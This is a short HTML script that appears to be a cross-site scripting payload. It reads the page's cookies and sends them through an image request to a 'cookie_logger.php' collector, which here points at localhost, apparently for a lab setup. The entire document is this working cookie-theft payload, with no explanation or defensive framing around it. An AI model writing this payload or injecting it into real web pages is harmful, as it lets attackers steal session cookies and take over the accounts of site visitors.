<script>
  // Send cookies to the localhost server
  var img = new Image();
  img.src = "http://localhost/cookie_catcher/cookie_logger.php?cookies=" + encodeURIComponent(document.cookie);
</script>
